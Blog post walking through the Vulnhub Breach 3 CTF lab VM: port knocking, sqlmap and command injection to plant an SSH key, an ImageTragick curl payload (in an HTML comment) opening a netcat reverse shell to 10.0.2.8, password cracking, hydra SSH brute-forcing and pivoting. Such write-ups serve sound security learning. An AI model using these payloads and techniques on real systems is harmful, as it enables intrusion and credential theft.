@@ -1,0 +1,875 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta itemprop="name" content="Vulnhub - Breach 3 boot2root CTF walkthrough">
+  <title>Vulnhub - Breach 3 boot2root CTF walkthrough</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta itemprop="description" content="This post goes through the steps of cracking the last boot2root virtual machine in the Breach series from vulnhub.">
+
+  
+  <meta itemprop="keywords" content="hacking, ctf, vulnhub" />
+  
+    <meta itemprop="wordCount" content="1877">
+  
+
+  <meta property="og:title" content="Vulnhub - Breach 3 boot2root CTF walkthrough" />
+  <meta property="og:description" content="This is my personal blog to keep track of stuff I am doing after hours." />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="http://localhost:1313/blog/2017/04/Vulnhub---Breach-3-boot2root-CTF-walkthrough/" />
+  
+
+  
+  <meta property="og:updated_time" content="2017-04-30 20:21:59 &#43;0000 UTC"/>
+  
+  
+  
+  
+
+  
+    <meta name="twitter:card" content="summary"/>
+  
+
+  
+  <meta name="twitter:title" content="Vulnhub - Breach 3 boot2root CTF walkthrough"/>
+  <meta name="twitter:description" content="This is my personal blog to keep track of stuff I am doing after hours."/>
+  
+  
+
+  
+  
+  <link href="http://localhost:1313//css/bootstrap.min.css" rel="stylesheet">
+  <link href="http://localhost:1313//css/hc.css" rel="stylesheet">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313//css/zenburn.css" type="text/css" media="screen" />
+
+  
+
+  
+  <link rel="stylesheet" href="http://localhost:1313//lightbox/css/lightbox.css" type="text/css" media="screen">
+
+  <meta name="generator" content="Hugo 0.37.1" />
+  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
+  
+  
+</head>
+
+
+  <body>
+
+  
+<div class="nav-toggle"><i class="fa fa-bars fa-2x"></i> Herring Cove </div>
+  <div id = "wrapper">
+
+<div class="navbar navbar-default" role="navigation">
+      <div class="container">
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a href="http://localhost:1313//"><p class="navbar-brand">camelinc</p></a>
+        </div>
+
+        <div class="navbar-collapse collapse">
+          <ul class="nav navbar-nav">
+					
+          <h2>http://localhost:1313/</h2>
+					
+					<li><a href="http://localhost:1313/about">About </a></li>
+					
+					<li><a href="http://localhost:1313/post">Posts </a></li>
+					
+          </ul>
+        </div>
+      </div>
+    </div>
+
+       
+       <div id="sidebar-wrapper">
+        <ul class="sidebar-nav">
+					<img src="/img/avatar.png" />
+          <li class="sidebar-brand"><a href="http://localhost:1313//"><h1 class="brand">camelinc</h1></a><h3>This is my personal blog to keep track of stuff I am doing after hours.</h3></li>
+          <hr />
+
+					
+						<li><a href="http://localhost:1313/about">About </a></li>
+					
+						<li><a href="http://localhost:1313/post">Posts </a></li>
+					
+          <hr />
+
+          <div id="social-wrapper">
+           
+             <li> <a href="https://twitter.com/camelinc"><i class="fa fa-twitter-square"></i> @twitter</a></li>
+           
+
+           
+             
+           
+
+           
+             
+           
+
+           
+             <li> <a href="https://github.com/camelinc"><i class="fa fa-github-square"></i> github</a> </li>
+           
+         </div>
+
+       </ul>
+     </div>
+
+     <div class="container">
+
+
+  <div id="article">
+    <div class="article-title">Vulnhub - Breach 3 boot2root CTF walkthrough</div>
+    <p class="meta"><small>&nbsp;<i class="fa fa-calendar-o"></i> 2017-04-30</small></p> <hr/>
+    <div class="post">
+      
+
+<h1 id="introduction">Introduction</h1>
+
+<p>The third boot2root system in the Breach series is an intermediate challenge.
+This time the VM will automatically acquire an IP address via DHCP.</p>
+
+<h1 id="flag-1">Flag 1</h1>
+
+<p>First, let&rsquo;s identify the target system.
+With netdiscover this is quite an easy task.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/discovery-1_1.png" data-lightbox="default" data-title="The target is at 10.0.2.9." >
+        <img src="/img/post/2017/vulnhub-breach-3/discovery-1_1.png" alt="The target is at 10.0.2.9." >
+    </a>
+</figure>
+
+
+
+<p>After identifying the target system at 10.0.2.9 a port scan to discover a potential attack vector for the breach.
+The SYN scan did not yield any results, all ports seem to be closed.
+The UDP scan shows that a service on port 161/udp is listening.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ nmap -n -Pn -sU -p- -iL scope -v --open -oA stage1_udp_<span class="k">$(</span>date <span class="s2">&#34;+%Y-%m-%d&#34;</span><span class="k">)</span> -T5
+Nmap scan report <span class="k">for</span> <span class="m">10</span>.0.2.9
+Not shown: <span class="m">65534</span> open<span class="p">|</span>filtered ports
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+<span class="m">161</span>/udp open  snmp
+MAC Address: <span class="m">08</span>:00:27:95:19:86 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span></code></pre></div>
+
+<p>Scanning the snmp service with the default settings might work and give some useful information.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/discovery-1_3.png" data-lightbox="default" data-title="The snmp service is talking to us." >
+        <img src="/img/post/2017/vulnhub-breach-3/discovery-1_3.png" alt="The snmp service is talking to us." >
+    </a>
+</figure>
+
+
+
+<p>This does not help.
+I cannot send Milton mails nor can I call him.
+So maybe there is a private community string that provides write access.
+Running onesixtyone to discovery additional community strings did not provide any additional info.
+Rescanning the system did not give any additional information either.</p>
+
+<p>After taking a look at the phone number scanning the three sets of numbers via nmap might provide a next step.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ nmap -n -Pn -sT <span class="m">10</span>.0.2.9 -p545,232,1876
+Nmap scan report <span class="k">for</span> <span class="m">10</span>.0.2.9
+PORT     STATE    SERVICE   REASON
+<span class="m">232</span>/tcp  filtered unknown   no-response
+<span class="m">545</span>/tcp  filtered ekshell   no-response
+<span class="m">1876</span>/tcp filtered ewcappsrv no-response</code></pre></div>
+
+<p>Nothing!
+So scan the system again via nmap just because.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ nmap -sS --top-ports <span class="m">100</span>  <span class="m">10</span>.0.2.9
+Nmap scan report <span class="k">for</span> <span class="m">10</span>.0.2.9
+Not shown: <span class="m">97</span> filtered ports
+PORT     STATE SERVICE
+<span class="m">22</span>/tcp   open  ssh
+<span class="m">23</span>/tcp   open  telnet
+<span class="m">5800</span>/tcp open  vnc-http</code></pre></div>
+
+<p>That is interesting.
+The telephone number seems to be a port knocking sequence.
+After connecting to the three ports 545,232,1876 some services are reachable on the target.
+Let&rsquo;s do a full portscan.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">PORT      STATE SERVICE      VERSION
+<span class="m">22</span>/tcp    open  ssh          OpenSSH <span class="m">6</span>.6.1p1 Ubuntu 2ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol <span class="m">2</span>.0<span class="o">)</span>
+<span class="m">23</span>/tcp    open  telnet?
+<span class="m">2048</span>/tcp  open  dls-monitor?
+<span class="m">4096</span>/tcp  open  bre?
+<span class="m">5800</span>/tcp  open  vnc-http?
+<span class="m">10007</span>/tcp open  <span class="nb">echo</span>
+<span class="m">10008</span>/tcp open  octopus?
+<span class="m">10009</span>/tcp open  swdtp-sv?
+<span class="m">10010</span>/tcp open  rxapi?</code></pre></div>
+
+<p>So there are a few services online, but only one has got version information associated with it.
+Let&rsquo;s take a quick look at the ssh service at port 22/tcp.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-1_2.png" data-lightbox="default" data-title="Another phone number." >
+        <img src="/img/post/2017/vulnhub-breach-3/services-1_2.png" alt="Another phone number." >
+    </a>
+</figure>
+
+
+
+<p>The message say that we should call 555-423-1800.
+This might be another port knocking sequence.
+Before digging deeper, let&rsquo;s go through the other services.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-1_3.png" data-lightbox="default" data-title="Probably not telnet." >
+        <img src="/img/post/2017/vulnhub-breach-3/services-1_3.png" alt="Probably not telnet." >
+    </a>
+</figure>
+
+
+
+<p>Then there is a service on port 2048/tcp.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-1_4.png" data-lightbox="default" data-title="Weird binary data." >
+        <img src="/img/post/2017/vulnhub-breach-3/services-1_4.png" alt="Weird binary data." >
+    </a>
+</figure>
+
+
+
+<p>Next is port 4096/tcp.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-1_5.png" data-lightbox="default" data-title="An interactive session." >
+        <img src="/img/post/2017/vulnhub-breach-3/services-1_5.png" alt="An interactive session." >
+    </a>
+</figure>
+
+
+
+<p>For each return input the service responds with a new line starting with an md5 hash followed by some binary blob.
+Not much help so far.
+Port 5800/tcp is next.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-1_6.png" data-lightbox="default" data-title="Milton&#39;s backdoor on port 5800/tcp." >
+        <img src="/img/post/2017/vulnhub-breach-3/services-1_6.png" alt="Milton&#39;s backdoor on port 5800/tcp." >
+    </a>
+</figure>
+
+
+
+<p>Awesome!
+This is milton&rsquo;s backdoor with a shell and some eavesdrop option.
+Let&rsquo;s give the shell a try.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-1_7.png" data-lightbox="default" data-title="Shell access via Milton&#39;s backdoor." >
+        <img src="/img/post/2017/vulnhub-breach-3/services-1_7.png" alt="Shell access via Milton&#39;s backdoor." >
+    </a>
+</figure>
+
+
+
+<p>Seem like Initech also did shut down this option.
+Port 10007/tcp does not provide any output.
+The service on port 10008/tcp responds with some strange banner and terminates the connection immediately.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-1_8.png" data-lightbox="default" data-title="Prototype unit 0001 is ready to accept programming on port 10008." >
+        <img src="/img/post/2017/vulnhub-breach-3/services-1_8.png" alt="Prototype unit 0001 is ready to accept programming on port 10008." >
+    </a>
+</figure>
+
+
+
+<p>Very weird.
+The second last service on port 10009/tcp says it is a Debian system.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-1_9.png" data-lightbox="default" data-title="Login to Debian Linux." >
+        <img src="/img/post/2017/vulnhub-breach-3/services-1_9.png" alt="Login to Debian Linux." >
+    </a>
+</figure>
+
+
+
+<p>Default credentials seem a bit weird.
+Also no binaries are present.
+That service is definitely fake.
+One last service is remaining.
+Let&rsquo;s take a look.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-1_10.png" data-lightbox="default" data-title="Microsoft Telnet Service" >
+        <img src="/img/post/2017/vulnhub-breach-3/services-1_10.png" alt="Microsoft Telnet Service" >
+    </a>
+</figure>
+
+
+
+<p>Port 10010/tcp has a Windows Telnet Service running.
+Not very likely.
+There seem to be a few fake services running.
+The best idea is to port knock the second phone number.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ nmap -n -Pn -sS <span class="m">10</span>.0.2.9 -p555,423,1800</code></pre></div>
+
+<p>Runnin nmap again and comparing the results shows that his was indeed a port knocking sequence.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ nmap -n -Pn -sS <span class="m">10</span>.0.2.9 -p-
+PORT      STATE SERVICE     VERSION
++8/tcp     open  unknown
+-22/tcp    open  ssh         OpenSSH <span class="m">6</span>.6.1p1 Ubuntu 2ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol <span class="m">2</span>.0<span class="o">)</span>
++22/tcp    open  ssh
+-23/tcp    open  telnet
+-2048/tcp  open  dls-monitor
+-4096/tcp  open  bre
+-5800/tcp  open  vnc-http
+-10007/tcp open  <span class="nb">echo</span>
+-10008/tcp open  octopus
+-10009/tcp open  swdtp-sv
+-10010/tcp open  rxapi</code></pre></div>
+
+<p>Connecting to the web server on port 8/tcp via netcat returns a http status header.</p>
+
+<p>As the realm states &ldquo;milton&rdquo; the password is probably one of the previously discovered ones - mine, thelaststraw or Hilton.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-2_2.png" data-lightbox="default" data-title="Milton&#39;s todo list" >
+        <img src="/img/post/2017/vulnhub-breach-3/services-2_2.png" alt="Milton&#39;s todo list" >
+    </a>
+</figure>
+
+
+
+<p>Voilà, we have access to Milton&rsquo;s ToDo list.
+Following the link leads to a login form.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-2_3.png" data-lightbox="default" data-title="Bobs Web Hosting Admin Portal login form." >
+        <img src="/img/post/2017/vulnhub-breach-3/services-2_3.png" alt="Bobs Web Hosting Admin Portal login form." >
+    </a>
+</figure>
+
+
+
+<p>Once again, sqlmap autospawns.
+After some tweaking the following command is capable of finding an sql injection in the logon form.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-2_5.png" data-lightbox="default" data-title="SQL injection in the `password` parameter." >
+        <img src="/img/post/2017/vulnhub-breach-3/services-2_5.png" alt="SQL injection in the `password` parameter." >
+    </a>
+</figure>
+
+
+
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">sqlmap -u http://10.0.2.9:8/breach3/index.php --data <span class="s2">&#34;username=admin&amp;password=admin&amp;submit=+Login+&#34;</span> --auth-cred<span class="o">=</span>milton:thelaststraw --auth-type<span class="o">=</span>basic  --level <span class="m">5</span> --risk <span class="m">3</span> --batch -p password --tamper equaltolike</code></pre></div>
+
+<p>Enumerate all the data.
+The two databases <code>backups</code> and <code>thebobs</code> only contain one table each.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-2_6.png" data-lightbox="default" data-title="`backups` database dump" >
+        <img src="/img/post/2017/vulnhub-breach-3/services-2_6.png" alt="`backups` database dump" >
+    </a>
+</figure>
+
+
+
+<p>So, milton&rsquo;s account is disabled according to the comment.
+Root does only have a question mark as a password.
+Seems like blumbergh has his password base64 encrypted.
+In fact the password is secured by a nested encryption algorithm which super difficult to crack.
+However, the following command can be utilized to decrypt it to cleartext.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">&#34;Vmxab2QxRXlTbGRqU0VaVlYwaENjVlJVUmt0aU1XeFhXWHBHVjFKVk5YVlZSbEYzVTNkdlBRbz0K&#34;</span> <span class="p">|</span> base64 -d - <span class="p">|</span> base64 -d - <span class="p">|</span> base64 -d - <span class="p">|</span> base64 -d - <span class="p">|</span> base64 -d -</code></pre></div>
+
+<p>Unfortunately, none of these credentials allow a successful logon.
+The other database does only contain one table with one row.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-2_7.png" data-lightbox="default" data-title="`thebobs` database dump" >
+        <img src="/img/post/2017/vulnhub-breach-3/services-2_7.png" alt="`thebobs` database dump" >
+    </a>
+</figure>
+
+
+
+<p>A search for the SHA-1 hash does not yield any results.
+That is weird.
+Looking again at the database and in particular the column name <code>password</code> it dawned.
+The hash is the password!</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-3_1.png" data-lightbox="default" data-title="Bobs Cloud Hosting Admin Console" >
+        <img src="/img/post/2017/vulnhub-breach-3/services-3_1.png" alt="Bobs Cloud Hosting Admin Console" >
+    </a>
+</figure>
+
+
+
+<p>With access to the admin panel there are a few web pages.
+The first step is to spider the links for any obvious pointers or clues.
+Also running gobuster for directory and file brute-force is always a good idea.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-3_2.png" data-lightbox="default" data-title="The paths and files on the webserver." >
+        <img src="/img/post/2017/vulnhub-breach-3/services-3_2.png" alt="The paths and files on the webserver." >
+    </a>
+</figure>
+
+
+
+<p>After the information gathering phase there remain a few static sites and two dynamic ones.
+For the sake of it, start burp intruder with a list from SecLists to fuzz them.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-3_3.png" data-lightbox="default" data-title="Fuzzing the support request." >
+        <img src="/img/post/2017/vulnhub-breach-3/services-3_3.png" alt="Fuzzing the support request." >
+    </a>
+</figure>
+
+
+
+<p>This results in different sized responses.
+To identify whether there exist any security problems just quickly send the base response and a different one to the comparer.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-3_4.png" data-lightbox="default" data-title="Base response compared to a fuzzed response - so sad." >
+        <img src="/img/post/2017/vulnhub-breach-3/services-3_4.png" alt="Base response compared to a fuzzed response - so sad." >
+    </a>
+</figure>
+
+
+
+<p>A smile does not seem to be a proper response.
+As the response size varies for a few requests, let&rsquo;s take a closer look.
+In the intruder session the particular response can be extracted via Grep - Extract.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-3_5.png" data-lightbox="default" data-title="The extracted information from the intruder attack." >
+        <img src="/img/post/2017/vulnhub-breach-3/services-3_5.png" alt="The extracted information from the intruder attack." >
+    </a>
+</figure>
+
+
+
+<p>Yeah, right.
+This seems like a pretty good hint.
+After some tweaking the request in the repeater the following intruder attack yielded some good results.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-3_6.png" data-lightbox="default" data-title="Classical command injection." >
+        <img src="/img/post/2017/vulnhub-breach-3/services-3_6.png" alt="Classical command injection." >
+    </a>
+</figure>
+
+
+
+<p>The parameter is vulnerable to classical command injection.
+Listing the home directory recursively shows that <code>thebobs</code> has his <code>.ssh/authorized_keys</code> file world writeable.
+Furthermore, <code>samir</code> can use chmod in the context of <code>thebobs</code>.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-3_7.png" data-lightbox="default" data-title="Sudo rights of `samir`." >
+        <img src="/img/post/2017/vulnhub-breach-3/services-3_7.png" alt="Sudo rights of `samir`." >
+    </a>
+</figure>
+
+
+
+<p>And last but not least, the file <code>flag1</code> is waiting in his home directory.
+We can simply add our own key, chmod 600 and try to log in.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">http://10.0.2.9:8/breach3/thebobscloudhostingllc/livechat.php?searcher<span class="o">=</span>echo+<span class="s2">&#34;ssh-rsa+AAAAB3NzaC1yc2EAAAADAQABAAABAQDGWh5/MWrFiXFpsaYPSQFGT87HXC1KwvdmP0CMWtAndH06zBs94NB7b7O3W78q/K7S4gE5J54vqSCTdGVjccZULa2xWe0d1twVA6ERT1sYgOyQpSNOyeKaDgqtCz1jMoaw7BbzZ2kyH0aHJEIRkd662VP9e4CV3LWaLn0HUiwduBcWI5vYg9BGhBsTt/eyH%2bmUfCMwuLO7q1zMFXIaw3eBROvE04Kgbf78ChH/imBVgN097gerMDY5JaH2Z7xe9Y7A1Nm%2bCdMRnQM7O2MEKOYEXGLWuCCUcBSjtrKghyoXptAPK79EF5eimVBWKt0xT%2b%2b/xCjQI9nGnXZ7ifYBcrMN+root%40kali&#34;</span>+&gt;+/home/thebobs/.ssh/authorized_keys
+http://10.0.2.9:8/breach3/thebobscloudhostingllc/livechat.php?searcher<span class="o">=</span>sudo+-u+thebobs+chmod+600+/home/thebobs/.ssh/authorized_keys
+http://10.0.2.9:8/breach3/thebobscloudhostingllc/livechat.php?searcher<span class="o">=</span>sudo+-u+thebobs+chmod+700+/home/thebobs/.ssh/</code></pre></div>
+
+<p>After adding the ssh key and fixing the permission we should be able to login to the system via ssh.
+According to <code>/etc/passwd</code> the user <code>thebobs</code> does have a python shell.
+By simply importing pty we can spawn a bash to have a proper shell.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-3_8.png" data-lightbox="default" data-title="Logging in after fixing the security issues." >
+        <img src="/img/post/2017/vulnhub-breach-3/services-3_8.png" alt="Logging in after fixing the security issues." >
+    </a>
+</figure>
+
+
+
+<p>Logged in as <code>thebobs</code> we are placed in the respective home directory.
+There was the flag just a minute ago.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/flag_1.png" data-lightbox="default" data-title="the_dmz_is_burning" >
+        <img src="/img/post/2017/vulnhub-breach-3/flag_1.png" alt="the_dmz_is_burning" >
+    </a>
+</figure>
+
+
+
+<p>Simply cat the first flag <code>breach3{the_dmz_is_burning}</code>.</p>
+
+<h1 id="flag-2">Flag 2</h1>
+
+<p>Enumerating the system to find the next clue is crucial.
+Luckily, the system has got nmap installed.
+Also, there are two qemu process running, likely with two more flags.
+The respective vm configuration at <code>/etc/libvirt/qemu/</code> is not accessible.
+Taking a look at the arp table reveals the ip addresses of the two vms.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-4_1.png" data-lightbox="default" data-title="Two arp entries in the range 192.168.122.0/24" >
+        <img src="/img/post/2017/vulnhub-breach-3/services-4_1.png" alt="Two arp entries in the range 192.168.122.0/24" >
+    </a>
+</figure>
+
+
+
+<p>The two entries do not respond to icmp pings or nmap scans.</p>
+
+<p>At this point I went on holiday for a week and restarted the machines.
+After the initial port knocking sequence to activate the SSH service we can simply continue where we left via the ssh key.</p>
+
+<p>This time, the two ip addresses from the arp table do respond to the pings.
+A quick port scan shows that the system 192.168.122.65 has a few services available.</p>
+
+<p>TODO: picture of results.</p>
+
+<p>The other system 192.168.122.28 does not offer any services.
+With a SOCKS proxy over the ssh tunnel we can access the web application (80/tcp) on the new target.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-4_3.png" data-lightbox="default" data-title="Initech Employee Intranet" >
+        <img src="/img/post/2017/vulnhub-breach-3/services-4_3.png" alt="Initech Employee Intranet" >
+    </a>
+</figure>
+
+
+
+<p>The web application is called the &ldquo;Initech Employee Intranet&rdquo;.
+In the web application only the PDF converter offers a suitable attack target on the first glance.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-4_4.png" data-lightbox="default" data-title="PDF converter" >
+        <img src="/img/post/2017/vulnhub-breach-3/services-4_4.png" alt="PDF converter" >
+    </a>
+</figure>
+
+
+
+<p>The upload create a web page where the respective file is sourced in an image tag.
+After some fiddling around with different file types and file contents one payload triggered a response.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-4_5.png" data-lightbox="default" data-title="PoC request with a response from the target." >
+        <img src="/img/post/2017/vulnhub-breach-3/services-4_5.png" alt="PoC request with a response from the target." >
+    </a>
+</figure>
+
+
+
+<!--
+curl -i -s -k  -X $'POST' \
+    -H $'Content-Type: multipart/form-data; boundary=---------------------------48227349914892921612020714535' \
+    --data-binary $'-----------------------------48227349914892921612020714535\x0d\x0aContent-Disposition: form-data; name=\"filename\"; filename=\"out.png\"\x0d\x0aContent-Type: image/png\x0d\x0a\x0d\x0apush graphic-context\x0d\x0aviewbox 0 0 640 480\x0d\x0afill \'url(https://example.com/image.jpg\"|mknod /tmp/pipez p;/bin/sh 0</tmp/pipez|nc 10.0.2.8 1111 1>/tmp/pipez;rm -rf \"/tmp/pipez)\'\x0d\x0apop graphic-context\x0d\x0a\x0d\x0a-----------------------------48227349914892921612020714535\x0d\x0aContent-Disposition: form-data; name=\"Submit\"\x0d\x0a\x0d\x0aSubmit\x0d\x0a-----------------------------48227349914892921612020714535--\x0d\x0a' \
+    $'http://192.168.122.65/intranet/pdfconverter.php'
+//-->
+
+<p>This part of the application seems to be vulnerable to <a href="https://imagetragick.com/">ImageTragick</a>.
+Next is to get a reverse connection to our attacking machine.
+The usual candidates are <code>nc</code> or <code>bash</code> pipes.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-4_6.png" data-lightbox="default" data-title="Reverse shell exploit." >
+        <img src="/img/post/2017/vulnhub-breach-3/services-4_6.png" alt="Reverse shell exploit." >
+    </a>
+</figure>
+
+
+
+<p>With a channel open we can examine the system in more detail.
+Upgrade to an interactive shell via <code>python -c &quot;import pty; pty.spawn('/bin/bash')&quot;</code>.
+The remaining files in the current web root directory do not contain anything.
+Going down the directory tree there is another html2 folder.
+That might contain the credentials for the HTTP Basic Authentication that nmap already discovered.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/services-4_7.png" data-lightbox="default" data-title="The .htaccess file contains a salted md5 hash." >
+        <img src="/img/post/2017/vulnhub-breach-3/services-4_7.png" alt="The .htaccess file contains a salted md5 hash." >
+    </a>
+</figure>
+
+
+
+<p>There is indeed the <code>.htaccess</code> file with credentials.
+The hash type <code>apr1</code> corresponds to salted md5.</p>
+
+<p>Quickly running john the ripper over the hash might provide the cleartext password.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/lazyadmin-cracked-1.1.png" data-lightbox="default" data-title="Cracked lazyadmins password: lazyadmin$apr1$T/HawTDx$Rustt4xkTc.rtvGXTnpkV1" >
+        <img src="/img/post/2017/vulnhub-breach-3/lazyadmin-cracked-1.1.png" alt="Cracked lazyadmins password: lazyadmin$apr1$T/HawTDx$Rustt4xkTc.rtvGXTnpkV1" >
+    </a>
+</figure>
+
+
+
+<p>There it is.
+The password was quite genious.
+Unfortunately, these credentials do not grant access to the web site.</p>
+
+<p>Doing some more research on the system yields the following additional information.
+There is a hidden <code>notes.txt</code> file in samir&rsquo;s home directory.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/notes.txt-1.1.png" data-lightbox="default" data-title="Notes.txt hidden in samirs home directory." >
+        <img src="/img/post/2017/vulnhub-breach-3/notes.txt-1.1.png" alt="Notes.txt hidden in samirs home directory." >
+    </a>
+</figure>
+
+
+
+<p>Furthermore, the nginx configuration mentions another .htpasswd file.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/nginx-1.1.png" data-lightbox="default" data-title="The nginx configuration file along with the second .htpasswd file." >
+        <img src="/img/post/2017/vulnhub-breach-3/nginx-1.1.png" alt="The nginx configuration file along with the second .htpasswd file." >
+    </a>
+</figure>
+
+
+
+<p>This time the credentials are for samir.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/samir-cracked-1.1.png" data-lightbox="default" data-title="The nginx configuration file along with the second .htpasswd file." >
+        <img src="/img/post/2017/vulnhub-breach-3/samir-cracked-1.1.png" alt="The nginx configuration file along with the second .htpasswd file." >
+    </a>
+</figure>
+
+
+
+<p>Again running john the ripper over the hash does not yield any results.
+Running jtr a second time, this time with the wordlist of so far discovered password and hints.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/samir-cracked-1.2.png" data-lightbox="default" data-title="Cracked samir password: samir:$apr1$TnnxXJtR$IaTU8tuLNk4EyJPWI.YF6." >
+        <img src="/img/post/2017/vulnhub-breach-3/samir-cracked-1.2.png" alt="Cracked samir password: samir:$apr1$TnnxXJtR$IaTU8tuLNk4EyJPWI.YF6." >
+    </a>
+</figure>
+
+
+
+<p>Voilà, another set of credentials has been discovered.
+These do in fact grant access to the web application on port 8800.
+To access the internal network, simply open an ssh socks proxy and adjust the browser settings accordingly.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">ssh -i /root/.ssh/id_rsa -l thebobs <span class="m">10</span>.0.2.9 -D <span class="m">8888</span></code></pre></div>
+
+<p>The different web scripts can be listed in the existing reverse shell.
+Only the file <code>comment.php</code> does contain a form with POST parameters.
+They might be the gateway to the next level, after spawning sqlmap.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/sqli-1.1.png" data-lightbox="default"  >
+        <img src="/img/post/2017/vulnhub-breach-3/sqli-1.1.png"  >
+    </a>
+</figure>
+
+
+
+<p>The sql injection vulnerabilty does actually not provide any additional information.
+Maybe something has been overlooked.
+According to <code>/etc/passwd</code> only peter has got a login shell.
+That is probably the only way left to go.
+Maybe he reused his password from another Breach boot2root machine.
+First, setup local port forwarding to directly access the target service.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">ssh -i /root/.ssh/id_rsa -l thebobs <span class="m">10</span>.0.2.9 -L <span class="m">65535</span>:192.168.122.65:22 -N</code></pre></div>
+
+<p>Now the tools can directly try to brute-force the password for the user peter.
+The wordlist contains all passwords encountered so far during the Breach series.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/hydra.png" data-lightbox="default" data-title="Running the wordlist of collected passwords against the ssh service" >
+        <img src="/img/post/2017/vulnhub-breach-3/hydra.png" alt="Running the wordlist of collected passwords against the ssh service" >
+    </a>
+</figure>
+
+
+
+<p>The python shell can again be upgraded to a full system shell.
+The second flag is present in peter home directory.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">breach3{what_secrets_is_bill_hiding?}</code></pre></div>
+
+<h1 id="flag-2-1">Flag 2</h1>
+
